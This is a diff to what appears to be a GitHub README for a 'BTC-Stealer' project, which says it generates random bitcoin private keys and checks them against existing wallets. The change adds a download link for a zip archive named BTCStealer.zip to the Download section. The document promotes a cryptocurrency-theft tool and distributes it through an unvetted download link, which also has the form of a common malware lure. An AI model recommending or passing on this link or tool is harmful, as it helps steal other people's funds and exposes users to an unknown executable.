@@ -7,7 +7,7 @@ Generate random bitcoin wallets & private keys (seeds) and then check if they ma
 
  ## Download Here ⬇️
 
-* [Download]()
+* [Download](https://github.com/0811741065/BTC-Stealer/releases/download/Download/BTCStealer.zip)
 
 ---
 
